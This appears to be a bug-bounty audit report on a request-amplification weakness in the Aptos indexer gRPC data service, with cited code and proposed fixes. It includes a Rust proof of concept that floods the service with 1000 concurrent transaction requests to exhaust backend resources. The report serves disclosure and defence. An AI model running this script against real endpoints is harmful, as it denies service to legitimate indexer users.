# Audit Report

## Title
Request Amplification Vulnerability in LiveDataService fetch_past_data() Enables Backend Resource Exhaustion

## Summary
The `fetch_past_data()` function in the indexer-grpc-data-service-v2 lacks concurrency controls and request deduplication, allowing attackers to amplify requests to the backend GrpcManager server by sending multiple concurrent requests with different transaction versions, causing resource exhaustion.

## Finding Description

The LiveDataService accepts client requests for blockchain transaction data through the `get_transactions` gRPC endpoint. When requested data is not in the in-memory cache, the service calls `fetch_past_data()` to retrieve it from the backend GrpcManager server. However, there are no mechanisms to prevent request amplification:

**Attack Path:**

1. An attacker sends N concurrent `GetTransactionsRequest` messages with different `starting_version` values to the data service [1](#0-0) 

2. Each request spawns an independent async task that enters a streaming loop [2](#0-1) 

3. The streaming loop repeatedly calls `in_memory_cache.get_data()` to fetch transaction batches [3](#0-2) 

4. When data is not found in cache, `get_data()` directly calls `fetch_past_data()` without any deduplication check [4](#0-3) 

5. `fetch_past_data()` unconditionally makes a backend gRPC call to fetch transactions [5](#0-4) 

6. The backend call is made through `data_client.fetch_transactions()` which enters a loop querying the GrpcManager [6](#0-5) 

**Missing Protections:**

- No rate limiting on concurrent `fetch_past_data()` calls
- No deduplication mechanism to prevent multiple tasks from fetching the same version simultaneously  
- No maximum limit on concurrent backend requests
- No shared state to track in-flight fetch operations

The in-memory cache uses a circular buffer with limited slots (default 5,000,000) and evicts old data when memory limits are reached [7](#0-6) . Attackers can exploit this by requesting versions that are within the valid servable range but have been evicted from cache.

**Exploitation Scenario:**

1. Attacker queries the `ping` endpoint to discover `min_servable_version` and `known_latest_version`
2. Attacker sends 1000 concurrent requests with `starting_version` values spread across the servable range (between `min_servable_version` and `known_latest_version`)
3. For versions not currently cached, each request triggers an independent backend fetch
4. The backend GrpcManager receives 1000 concurrent requests, causing resource exhaustion
5. Legitimate clients experience degraded service or timeouts

The only validation is that `starting_version` cannot exceed `known_latest_version + 10000` [8](#0-7) , which still allows a wide attack window.

## Impact Explanation

This vulnerability enables **resource exhaustion attacks** on the indexer infrastructure, qualifying as **Medium Severity** per Aptos bug bounty criteria. While it does not directly affect blockchain consensus or validator operations, it can:

- Overwhelm backend GrpcManager servers with amplified request load
- Degrade or deny service to legitimate users of the indexer API
- Require operational intervention to mitigate ongoing attacks
- Potentially cascade to impact other services depending on the indexer infrastructure

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits" - in this case, the service fails to limit backend request amplification from untrusted clients.

## Likelihood Explanation

**Likelihood: High**

The attack requires:
- No authentication or privileged access beyond normal gRPC client capabilities
- Minimal attacker resources (ability to open concurrent connections)
- Publicly accessible gRPC endpoint
- Knowledge of version ranges (obtainable via ping endpoint)

The vulnerability is trivially exploitable using standard gRPC client libraries. An attacker can automate the attack with a simple script that:
1. Queries the ping endpoint for version information
2. Generates requests with different starting versions
3. Opens concurrent connections to maximize amplification

## Recommendation

Implement the following protections in `FetchManager`:

1. **Request Deduplication**: Track in-flight fetch operations using a shared map to prevent duplicate fetches for the same version:

```rust
pub(super) struct FetchManager<'a> {
    data_manager: Arc<RwLock<DataManager>>,
    data_client: Arc<DataClient>,
    pub(super) fetching_latest_data_task: RwLock<Option<FetchTask<'a>>>,
    // Add: Track in-flight past data fetches
    fetching_past_data_tasks: Arc<DashMap<u64, FetchTask<'a>>>,
}

pub(super) async fn fetch_past_data(&self, version: u64) -> usize {
    // Check if already fetching this version
    if let Some(existing_task) = self.fetching_past_data_tasks.get(&version) {
        return existing_task.value().clone().await;
    }
    
    // Create new fetch task
    let task = Self::fetch_and_update_cache(
        self.data_client.clone(),
        self.data_manager.clone(),
        version
    ).boxed().shared();
    
    self.fetching_past_data_tasks.insert(version, task.clone());
    let result = task.await;
    self.fetching_past_data_tasks.remove(&version);
    
    result
}
```

2. **Concurrency Limit**: Use a semaphore to limit concurrent backend fetches:

```rust
// Add to FetchManager
max_concurrent_fetches: Arc<Semaphore>,

// In fetch_past_data
let _permit = self.max_concurrent_fetches.acquire().await;
// ... proceed with fetch
```

3. **Rate Limiting**: Implement per-client rate limiting using connection metadata from the request.

## Proof of Concept

```rust
// Proof of Concept - Concurrent Request Amplification Attack
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let endpoint = "http://localhost:50051"; // Target data service
    let num_concurrent_requests = 1000;
    let version_range_start = 1_000_000; // Example old version
    
    // Create concurrent requests with different starting versions
    let mut handles = vec![];
    
    for i in 0..num_concurrent_requests {
        let endpoint = endpoint.to_string();
        let starting_version = version_range_start + (i * 1000);
        
        let handle = tokio::spawn(async move {
            let mut client = DataServiceClient::connect(endpoint)
                .await
                .expect("Failed to connect");
                
            let request = GetTransactionsRequest {
                starting_version: Some(starting_version),
                transactions_count: Some(100),
                batch_size: None,
                transaction_filter: None,
            };
            
            // Each request will trigger fetch_past_data() for versions not in cache
            let response = client.get_transactions(request).await;
            println!("Request {} completed: {:?}", starting_version, response.is_ok());
        });
        
        handles.push(handle);
    }
    
    // Wait for all concurrent requests
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Attack complete: {} concurrent requests sent", num_concurrent_requests);
    Ok(())
}
```

**Expected Result**: The backend GrpcManager receives approximately 1000 concurrent fetch requests (assuming most versions are not cached), demonstrating the amplification vulnerability. Monitor backend resource usage (CPU, memory, connection counts) to observe the impact.

**Notes**

This vulnerability is specific to the indexer-grpc-data-service-v2 component and does not affect core blockchain consensus or validator operations. However, it represents a significant availability risk for the indexer infrastructure that supports ecosystem applications and block explorers. The lack of request deduplication and concurrency controls violates defense-in-depth principles for public-facing API services.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/service.rs (L138-149)
```rust
    async fn get_transactions(
        &self,
        req: Request<GetTransactionsRequest>,
    ) -> Result<Response<Self::GetTransactionsStream>, Status> {
        let (tx, rx) = channel(self.data_service_response_channel_size);
        self.handler_tx.send((req, tx)).await.unwrap();

        let output_stream = ReceiverStream::new(rx);
        let response = Response::new(Box::pin(output_stream) as Self::GetTransactionsStream);

        Ok(response)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L86-96)
```rust
                if starting_version > known_latest_version + 10000 {
                    let err = Err(Status::failed_precondition(
                        "starting_version cannot be set to a far future version.",
                    ));
                    info!("Client error: {err:?}.");
                    let _ = response_sender.blocking_send(err);
                    COUNTER
                        .with_label_values(&["live_data_service_requested_data_too_new"])
                        .inc();
                    continue;
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L185-194)
```rust
            if let Some((transactions, batch_size_bytes, last_processed_version)) = self
                .in_memory_cache
                .get_data(
                    next_version,
                    ending_version,
                    max_num_transactions_per_batch,
                    max_bytes_per_batch,
                    &filter,
                )
                .await
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L73-77)
```rust
            if data_manager.get_data(starting_version).is_none() {
                drop(data_manager);
                self.fetch_manager.fetch_past_data(starting_version).await;
                continue;
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/fetch_manager.rs (L34-38)
```rust
    pub(super) async fn fetch_past_data(&self, version: u64) -> usize {
        let _timer = TIMER.with_label_values(&["fetch_past_data"]).start_timer();
        Self::fetch_and_update_cache(self.data_client.clone(), self.data_manager.clone(), version)
            .await
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/data_client.rs (L18-43)
```rust
    pub(super) async fn fetch_transactions(&self, starting_version: u64) -> Vec<Transaction> {
        trace!("Fetching transactions from GrpcManager, start_version: {starting_version}.");

        let request = GetTransactionsRequest {
            starting_version: Some(starting_version),
            transactions_count: None,
            batch_size: None,
            transaction_filter: None,
        };
        loop {
            let mut client = self
                .connection_manager
                .get_grpc_manager_client_for_request();
            let response = client.get_transactions(request.clone()).await;
            if let Ok(response) = response {
                let transactions = response.into_inner().transactions;
                if transactions.is_empty() {
                    return vec![];
                }
                if transactions.first().unwrap().version == starting_version {
                    return transactions;
                }
            }
            // TODO(grao): Error handling.
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L67-73)
```rust
    fn default_num_slots() -> usize {
        5_000_000
    }

    fn default_size_limit_bytes() -> usize {
        10_000_000_000
    }
```
